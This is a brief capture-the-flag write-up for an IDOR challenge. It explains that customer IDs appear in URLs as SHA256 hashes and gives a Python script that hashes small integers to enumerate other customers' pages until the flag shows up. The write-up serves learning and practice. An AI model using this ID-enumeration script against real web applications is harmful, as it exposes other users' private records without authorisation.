The challenge name suggests that it will be an IDOR challenge.

Visiting the website, note that a SHA256 hash is appended to the URL. 
```
http://challenge.nahamcon.com:31646/4fc82b26aecb47d2868c4efbe3581732a3e7cbcc6c2efb32062c08170a05eeb8
```

Cracking the hash reveals that is `11`, which is the customer ID.
So, we can solve this challenge by SHA256 hashing numbers to fuzz the customer ID parameter.

## Solution

```py
#!/usr/bin/env python3

import requests
from hashlib import sha256

url = "http://challenge.nahamcon.com:31646"
for i in range(10):
	customer_id = sha256(str(i).encode('utf-8')).hexdigest()
	response = requests.get(f"{url}/{customer_id}")
	if "flag" in response.text:
		print(response.text)
		break
```